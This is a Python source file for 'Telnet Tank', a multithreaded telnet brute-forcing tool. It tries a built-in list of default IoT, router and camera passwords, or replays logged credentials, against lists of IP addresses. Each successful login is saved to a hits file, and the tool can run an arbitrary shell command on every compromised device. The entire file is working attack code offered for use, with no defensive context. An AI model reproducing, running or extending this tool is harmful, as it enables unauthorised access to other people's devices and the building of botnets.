#!/usr/bin/env python3
import os
import sys
import io
import time
import signal
import socket
import argparse
import threading

# Force UTF-8 so the banner works on latin-1 terminals
if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

from queue import Queue, Empty
from sys import stdout

# ---------- Colors ----------
R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'
G='\033[1;32m'; Y='\033[1;33m'; Q='\033[1;36m'
W='\033[0m'

# ANSI helpers for the live status line
CLEAR_LINE = '\033[2K\r'
CURSOR_HIDE = '\033[?25l'
CURSOR_SHOW = '\033[?25h'
STATUS_PREFIX = '\033[1;30m'  # dim

# ---------- Combo list ----------
combo = [
    "root:root", "admin:admin", "admin:ADMIN", "daemon:daemon", "root:vizxv",
    "root:pass", "root:anko", "root:1234", "root:", "admin:", "root:xc3511",
    "root:juantech", "default:", "default:default", "supervisor:zyad1234",
    "root:5up", "default:lJwpbo6", "daemon:", "adm:", "root:696969",
    "root:1234567", "User:admin", "guest:12345", "guest:password",
    "root:zlxx.", "root:1001chin", "root:hunt5759", "admin:true", "admin:changeme",
    "baby:baby", "root:xmhdipc", "root:12341234", "root:ttnet",
    "root:Serv4EMC", "default:S2fGqNFs", "default:OxhlwSG8", "toor:root",
    "root:toor", "vstarcam2015:20150602", "root:zsun1188",
    "admin:meinsm", "admin:adslnadam", "root:ipcam_rt5350", "Menara:Menara",
    "admin:ho4uku6at", "root:t0talc0ntr0l4!", "admin:gvt12345", "adminisp:adminisp",
    "root:hi3518", "root:ikwb", "admin:ip3000", "admin:1234", "admin:12345",
    "telnet:telnet", "admin:1234567", "root:system", "admin:password",
    "root:888888", "root:88888888", "root:klv1234", "root:Zte521",
    "root:jvbzd", "root:7ujMko0vizxv", "root:7ujMko0admin", "root:dreambox",
    "root:user", "root:realtek", "root:00000000", "admin:1111111", "admin:54321",
    "admin:123456", "default:123456", "default:antslq", "default:tlJwpbo6",
    "root:default", "default:pass", "default:12345", "default:password",
    "root:taZz@23495859", "root:20080826", "admin:7ujMko0admin", "root:gforge",
    "admin:synnet", "guest:1111", "root:admin1234", "root:tl789",
    "admin:fliradmin", "root:12345678", "root:123456789", "root:1234567890",
    "root:vertex25ektks123", "root:admin@mymifi", "admin:pass",
    "admin:admin1234", "admin:smcadmin", "root:1111", "admin:1111",
    "root:54321", "root:666666", "root:klv123", "Administrator:admin",
    "service:service", "supervisor:supervisor", "admin1:password",
    "administrator:1234", "666666:666666", "888888:888888", "tech:tech",
    "admin:dvr2580222", "ubnt:ubnt", "user:12345", "admin:aquario",
    "ftp:ftp", "hikvision:hikvision", "guest:guest", "user:user",
    "root:abc123", "root:admin", "root:123456", "sysadm:sysadm",
    "support:support", "root:password", "bin:", "root:cat1029",
    "admin:cat1029", "mother:fucker", "root:antslq",
]

# ---------- Globals ----------
output_file = "hits.txt"
input_file_path = None
debug = False
timeout = 5
command = None
queue = Queue()
ok_count = 0
fail_count = 0
lock = threading.Lock()

# Live stats
start_time = time.time()
total_targets = 0
processed_count = 0
stats_lock = threading.Lock()
status_thread = None

# Track completed lines (raw text from input file) so we can strip them
completed_lines = []
completed_lock = threading.Lock()

# Graceful shutdown
shutdown = threading.Event()

# Track active Router threads
active_workers = []
active_lock = threading.Lock()


# ---------- Help menu ----------
def print_help():
    print(f"""
{C}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘{G}                     T E L N E T   T A N K                          {C}â•‘
â•‘{Y}              @Syn2Much  |  Code Fixed  |  v1.0                      {C}â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{W}

{C}â”Œâ”€{G} USAGE {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
   {Y}python3 main.py {C}[{G}OPTIONS{C}]{W}

{C}â”Œâ”€{G} INPUT MODES {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
   {G}Log mode:{C}    each line = {Y}ip:port user:pass{C}
                â†’ tries that {B}exact credential{C} only
   {G}Brute mode:{C}  each line = {Y}ip{C} or {Y}ip:port{C}
                â†’ brute-forces the built-in combo list

{C}â”Œâ”€{G} OPTIONS {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
   {G}-h, --help{C}              {C}Show this help menu{W}
   {G}-f, --file {Y}<file>{C}       {C}Targets file (log or IP list){W}
   {G}-x, --target {Y}<tgt>{C}      {C}Single target: {Y}ip{C}, {Y}ip:port{C}, or {Y}"ip:port user:pass"{W}
   {G}-t, --threads {Y}<n>{C}       {C}Number of worker threads {Y}(default: 50){W}
   {G}-c, --command {Y}<cmd>{C}     {C}Shell command to run after successful login{W}
   {G}-g, --timeout {Y}<sec>{C}     {C}Socket timeout in seconds {Y}(default: 5){W}
   {G}-o, --output {Y}<file>{C}     {C}Hits file â€” {G}appended{C}, never overwritten {Y}(default: hits.txt){W}
   {G}-d, --debug{C}              {C}Verbose per-attempt output{W}
   {G}-k, --keep{C}               {C}Do {Y}not{C} strip processed lines from input file on exit{W}

{C}â”Œâ”€{G} EXAMPLES {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
   {C}# Brute a list of IPs{C}
   {Y}python3 main.py -f ips.txt -t 100 -g 5{W}

   {C}# Replay a credential log{C}
   {Y}python3 main.py -f creds.txt -t 50{W}

   {C}# Single target, brute{C}
   {Y}python3 main.py -x 1.2.3.4{W}

   {C}# Single target with creds{C}
   {Y}python3 main.py -x "1.2.3.4:23 root:root"{W}

   {C}# Login then drop a command{C}
   {Y}python3 main.py -f creds.txt -c "id; uname -a"{W}

   {C}# Keep input file untouched{C}
   {Y}python3 main.py -f ips.txt -k{W}

{C}â”Œâ”€{G} NOTES {C}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{W}
   {G}â€¢{C} Press {Y}Ctrl+C{C} any time â€” the program saves, strips processed
     lines from the input file, and exits gracefully
   {G}â€¢{C} Hits are {G}appended{C} to the output file (never overwritten)
   {G}â€¢{C} Each hit is flushed to disk immediately after discovery
   {G}â€¢{C} Live progress bar is updated every second at the bottom

{C}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜{W}
""")


# ---------- Signal handling ----------
def handle_signal(signum, frame):
    if not shutdown.is_set():
        # Move the cursor down one line so the status bar doesn't overwrite our message
        print(f"\n{Y}[!] Signal {signum} received â€” finishing current task and saving...{C}")
        shutdown.set()


signal.signal(signal.SIGINT,  handle_signal)
signal.signal(signal.SIGTERM, handle_signal)


# ---------- Live status bar ----------
def human_time(seconds):
    seconds = int(seconds)
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    if h:
        return f"{h}h{m:02d}m{s:02d}s"
    if m:
        return f"{m}m{s:02d}s"
    return f"{s}s"


def print_status():
    """Repaint the live status line at the bottom."""
    global processed_count

    with stats_lock:
        remaining = total_targets - processed_count
        elapsed = time.time() - start_time
        speed = processed_count / elapsed if elapsed > 0 else 0
        ok = ok_count
        fail = fail_count
        active = len(active_workers)

    bar_width = 30
    pct = (processed_count / total_targets) if total_targets else 0
    filled = int(bar_width * pct)
    bar = f"{G}{'â–ˆ' * filled}{STATUS_PREFIX}{'â–‘' * (bar_width - filled)}{W}"

    line = (
        f"{STATUS_PREFIX}[{W}"
        f"{Y}{processed_count}{W}/{C}{total_targets}{W} "
        f"{bar} "
        f"{G}âœ“{ok}{W} "
        f"{R}âœ—{fail}{W} "
        f"{B}act{active}{W} "
        f"{Q}{speed:4.1f}/s{W} "
        f"{STATUS_PREFIX}{human_time(elapsed)}{W}"
        f"{STATUS_PREFIX}]{W}"
    )
    # Truncate to terminal width so we don't wrap
    try:
        width = os.get_terminal_size().columns - 1
    except OSError:
        width = 120
    stdout.write(CLEAR_LINE + line[:width])
    stdout.flush()


def status_loop():
    while not shutdown.is_set():
        try:
            print_status()
        except Exception:
            pass
        time.sleep(1)
    # One final paint
    try:
        print_status()
    except Exception:
        pass


# ---------- Helpers ----------
def readUntil(tn, string, timeout=8):
    buf = b''
    start_time_ = time.time()
    while time.time() - start_time_ < timeout:
        if shutdown.is_set():
            raise Exception('SHUTDOWN')
        try:
            chunk = tn.recv(1024)
            if not chunk:
                break
            buf += chunk
            if string.encode() in buf:
                return buf.decode(errors='ignore')
        except socket.timeout:
            break
        except Exception:
            break
    if string.encode() in buf:
        return buf.decode(errors='ignore')
    raise Exception('TIMEOUT!')


def save_hit(ip, port, username, password):
    """Append a hit to the output file and flush immediately."""
    line = f"{ip}:{port} {username}:{password}\n"
    with lock:
        try:
            with open(output_file, "a") as f:
                f.write(line)
                f.flush()
                os.fsync(f.fileno())
        except Exception as e:
            print(f"{R}[!] Could not save hit: {e}{C}")


def try_login(ip, port, username, password):
    """Attempt a single login. Returns True on success."""
    if shutdown.is_set():
        return False

    tn = None
    try:
        tn = socket.socket()
        tn.settimeout(1.5 if shutdown.is_set() else timeout)
        tn.connect((ip, port))
    except Exception:
        if tn:
            try: tn.close()
            except: pass
        return False

    if debug:
        # Clear the status line before printing debug so it doesn't mix
        stdout.write(CLEAR_LINE)
        print(f"[DEBUG] {ip}:{port} -> {username}:{password}")

    try:
        hoho = readUntil(tn, "ogin", timeout=timeout)
        if "ogin" in hoho:
            tn.send((username + "\n").encode())
            time.sleep(0.09)
        else:
            tn.close()
            return False
    except Exception:
        try: tn.close()
        except: pass
        return False

    try:
        hoho = readUntil(tn, "assword", timeout=timeout)
        if "assword" in hoho:
            tn.send((password + "\n").encode())
            time.sleep(0.8)
        else:
            tn.close()
            return False
    except Exception:
        try: tn.close()
        except: pass
        return False

    try:
        prompt = tn.recv(40960).decode(errors='ignore')
    except Exception:
        try: tn.close()
        except: pass
        return False

    success = False
    if ">" in prompt and "ONT" not in prompt:
        success = True
    elif any(c in prompt for c in ["#", "$", "%", "@"]):
        success = True

    bad_words = ["failed", "incorrect", "invalid", "ogin:", "locked",
                 "rong", "ailure", "erro", "denied"]
    if any(w in prompt.lower() for w in bad_words):
        success = False

    if success:
        save_hit(ip, port, username, password)
        stdout.write(CLEAR_LINE)
        print(f'{C}[{G}OK{C}] {Y}{ip}{C}:{Y}{port}{C}  {B}{username}{C}:{B}{password}{C}')

        if command and not shutdown.is_set():
            try:
                tn.send((command + "\n").encode())
                time.sleep(0.5)
                out = tn.recv(40960).decode(errors='ignore')
                stdout.write(CLEAR_LINE)
                print(f'{C}[{G}CMD{C}] {ip} -> {Q}{command}{C}')
                if out.strip():
                    print(out)
            except Exception as e:
                stdout.write(CLEAR_LINE)
                print(f'{C}[{R}CMD-ERR{C}] {ip}: {e}')

    try: tn.close()
    except: pass
    return success


# ---------- Router / target worker ----------
class Router(threading.Thread):
    def __init__(self, ip, port, creds=None, raw_line=None):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.creds = creds
        self.raw_line = raw_line

    def run(self):
        global ok_count, fail_count, processed_count

        try:
            if not shutdown.is_set():
                if self.creds:
                    u, p = self.creds
                    ok = try_login(self.ip, self.port, u, p)
                    with lock:
                        if ok: ok_count += 1
                        else:  fail_count += 1
                else:
                    hit = False
                    for passwd in combo:
                        if shutdown.is_set():
                            return
                        if ":" in passwd:
                            u, p = passwd.split(":", 1)
                        else:
                            u, p = passwd, ""
                        if try_login(self.ip, self.port, u, p):
                            with lock:
                                ok_count += 1
                            hit = True
                            break
                    if not hit:
                        with lock:
                            fail_count += 1
        finally:
            with stats_lock:
                processed_count += 1
            if self.raw_line is not None:
                with completed_lock:
                    completed_lines.append(self.raw_line)


# ---------- Worker pool ----------
def worker():
    while not shutdown.is_set():
        try:
            item = queue.get_nowait()
        except Empty:
            return

        try:
            if isinstance(item, tuple) and len(item) == 4:
                ip, port, creds, raw = item
                t = Router(ip, port, creds, raw)
            else:
                ip, port, raw = item
                t = Router(ip, port, None, raw)

            with active_lock:
                active_workers.append(t)
            t.start()
            t.join()
            with active_lock:
                if t in active_workers:
                    active_workers.remove(t)
        except Exception:
            pass
        finally:
            try: queue.task_done()
            except: pass


# ---------- Arg parsing ----------
def parse_line(line):
    stripped = line.strip()
    if not stripped:
        return None

    parts = stripped.split()
    creds = None
    hostport = parts[0]

    if len(parts) >= 2 and ":" in parts[1]:
        creds = tuple(parts[1].split(":", 1))

    if ":" in hostport:
        ip, port_str = hostport.rsplit(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            ip, port = hostport, 23
    else:
        ip, port = hostport, 23

    return ip, port, creds


def strip_completed(input_path, keep=False):
    """Rewrite the input file without the completed raw lines."""
    if keep:
        print(f"{C}[{Y}i{C}] --keep set, input file left untouched.{W}")
        return
    if not input_path:
        return
    with completed_lock:
        done = set(completed_lines)
    if not done:
        return

    try:
        with open(input_path, "r") as f:
            remaining = [ln for ln in f if ln.rstrip("\n") not in done
                         and ln.strip() and ln.rstrip("\n") not in {d.rstrip("\n") for d in done}]
        # Preserve exactly the lines whose stripped form wasn't marked done
        with open(input_path, "r") as f:
            original = f.readlines()
        with completed_lock:
            done_raw = set(completed_lines)
            done_stripped = {d.strip() for d in done_raw}
        remaining = [ln for ln in original
                     if ln.strip() and ln.strip() not in done_stripped]

        with open(input_path, "w") as f:
            f.writelines(remaining)
        removed = len(original) - len(remaining)
        print(f"{C}[{Y}i{C}] Stripped {G}{removed}{C} completed line(s) from "
              f"{Y}{input_path}{C}. {G}{len(remaining)}{C} remaining.{W}")
    except Exception as e:
        print(f"{R}[!] Could not update input file: {e}{W}")


def main():
    global debug, timeout, command, output_file, input_file_path
    global total_targets, status_thread

    print(r"""
 â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ          â–ˆâ–ˆâ–ˆâ–ˆ                         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                   
â–‘â–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–ˆ         â–‘â–‘â–ˆâ–ˆâ–ˆ                        â–‘â–‘â–ˆâ–ˆâ–ˆ                    
â–‘   â–‘â–ˆâ–ˆâ–ˆ  â–‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 
    â–‘â–ˆâ–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ
    â–‘â–ˆâ–ˆâ–ˆ    â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆ â–‘â–‘â–‘ 
    â–‘â–ˆâ–ˆâ–ˆ    â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘   â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘   â–‘â–ˆâ–ˆâ–ˆ     
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    
   â–‘â–‘â–‘â–‘â–‘     â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘â–‘   â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘     
    """)

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show help menu')
    parser.add_argument('-f', '--file', help="targets file (ip, ip:port, or 'ip:port user:pass')")
    parser.add_argument('-x', '--target', help="single target (ip, ip:port, or 'ip:port user:pass')")
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of worker threads')
    parser.add_argument('-c', '--command', help='command to execute after login')
    parser.add_argument('-g', '--timeout', type=int, default=5, help='Socket timeout (seconds)')
    parser.add_argument('-o', '--output', default='hits.txt', help='Output file for hits (appended)')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug output')
    parser.add_argument('-k', '--keep', action='store_true',
                        help='Do not strip processed lines from the input file on exit')

    args = parser.parse_args()

    if args.help or len(sys.argv) < 2:
        print_help()
        return

    if not args.file and not args.target:
        print(f"{R}[!] Missing arguments: provide {Y}-f/--file{C} or {Y}-x/--target{C}")
        print(f"{C}    Run {Y}python3 main.py -h{C} for help.{W}")
        return

    timeout = args.timeout
    command = args.command
    output_file = args.output
    debug = args.debug
    input_file_path = args.file

    # Make sure output file is writable (append mode)
    try:
        with open(output_file, "a") as f:
            pass
    except Exception as e:
        print(f"{R}[!] Cannot write to output file '{output_file}': {e}{W}")
        return

    print(f"{C}[{G}+{C}] Hits will be appended to: {Y}{output_file}{C}")
    print(f"{C}[{G}+{C}] Press Ctrl+C to stop gracefully at any time.{W}")

    # Build target lines
    if args.file:
        try:
            with open(args.file, "r") as fh:
                lines = fh.readlines()
        except FileNotFoundError:
            print(f"{R}[!] File '{args.file}' not found{W}")
            return
    else:
        lines = [args.target]

    # Parse each line and put on queue
    count = 0
    for raw in lines:
        parsed = parse_line(raw)
        if not parsed:
            continue
        ip, port, creds = parsed
        count += 1
        if creds:
            queue.put((ip, port, creds, raw.rstrip("\n")))
        else:
            queue.put((ip, port, raw.rstrip("\n")))

    total_targets = count

    if total_targets == 0:
        print(f"{R}[!] No valid targets in input.{W}")
        return

    print(f"{C}[{G}+{C}] Loaded {Y}{total_targets}{C} target(s).")
    print(f"{C}[{G}+{C}] Spawning {Y}{args.threads}{C} worker thread(s).\n")

    # Spawn worker threads
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    # Hide cursor and start live status loop
    stdout.write(CURSOR_HIDE)
    stdout.flush()
    status_thread = threading.Thread(target=status_loop, daemon=True)
    status_thread.start()

    # Wait for queue to drain OR shutdown
    try:
        while not shutdown.is_set():
            try:
                queue.join()
                break
            except KeyboardInterrupt:
                handle_signal(signal.SIGINT, None)
    except KeyboardInterrupt:
        handle_signal(signal.SIGINT, None)

    if shutdown.is_set():
        stdout.write(CLEAR_LINE)
        print(f"{Y}[!] Waiting for in-flight logins to finish...{W}")
    for t in threads:
        t.join(timeout=5)

    with active_lock:
        remaining = list(active_workers)
    for t in remaining:
        t.join(timeout=3)

    # Stop status thread
    shutdown.set()
    if status_thread:
        status_thread.join(timeout=2)

    # Restore cursor
    stdout.write(CURSOR_SHOW + CLEAR_LINE)
    stdout.flush()

    # Strip processed lines from the input file
    if input_file_path:
        strip_completed(input_file_path, keep=args.keep)

    elapsed = time.time() - start_time
    print(f"\n[{Y}-{C}] Done. "
          f"OK: {G}{ok_count}{C}  "
          f"Fail: {R}{fail_count}{C}  "
          f"Time: {Q}{human_time(elapsed)}{C}")
    print(f"[{Y}-{C}] Hits saved to: {Y}{output_file}{W}")


if __name__ == "__main__":
    main()
